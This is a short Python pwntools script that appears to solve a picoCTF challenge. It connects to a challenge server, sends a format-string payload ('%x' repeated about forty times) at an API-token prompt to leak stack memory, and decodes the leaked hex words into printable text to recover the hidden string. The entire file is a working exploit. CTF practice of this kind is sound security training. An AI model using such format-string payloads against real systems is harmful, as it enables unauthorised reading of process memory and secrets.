# import pwntools
from pwn import *

# string to write to
s = ""

# open up remote connection
r = remote('mercury.picoctf.net', 16439)

# get to vulnerability
r.recvuntil("View my")
r.send("1\n")
r.recvuntil("What is your API token?\n")

# send string to print stack
r.send("%x" + "-%x"*40 + "\n")

# receive until the line we want
r.recvline()

# read in line
x = r.recvline()
#print("before decode:\n",x,'\n')

# remove unwanted components
x = x[:-1].decode()
#print("after decode:\n",x)

# parse to characters
for i in x.split('-'):
    #print(i)	
    if len(i) == 8:
        a = bytearray.fromhex(i)

        for b in reversed(a):
            if b > 32 and b < 128:
                s += chr(b)

# print string
print(s)

